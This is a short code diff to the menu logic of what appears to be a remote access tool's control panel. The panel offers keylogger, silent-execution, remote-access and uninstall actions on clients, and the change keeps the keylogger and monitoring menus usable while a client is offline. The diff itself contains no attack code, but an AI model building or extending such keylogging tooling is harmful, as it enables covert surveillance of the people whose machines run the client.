@@ -371,8 +371,8 @@ function applyMenuSupportRules(clientId) {
   const keyloggerSupported = isWindows || platform === "mac";
   setAvailability(
     keyloggerBtn,
-    isOnline && keyloggerSupported,
-    isOnline ? "Keylogger is not supported on this platform." : "Client is offline",
+    keyloggerSupported,
+    "Keylogger is not supported on this platform.",
   );
 
   const winreBtn = menu.querySelector('[data-open="winre"]');
@@ -400,9 +400,14 @@ function applyMenuSupportRules(clientId) {
     setAvailability(silentExecBtn, isOnline, "Client is offline");
   }
 
-  ["remote-access", "monitoring", "system"].forEach(groupId => {
+  ["remote-access", "system"].forEach(groupId => {
     setAvailability(menu.querySelector(`[data-group-toggle="${groupId}"]`), isOnline, "Client is offline");
   });
+  setAvailability(
+    menu.querySelector('[data-group-toggle="monitoring"]'),
+    isOnline || keyloggerSupported,
+    keyloggerSupported ? "" : "Client is offline",
+  );
 
   ["ping", "reconnect", "disconnect", "uninstall"].forEach(action => {
     setAvailability(menu.querySelector(`[data-action="${action}"]`), isOnline, "Client is offline");
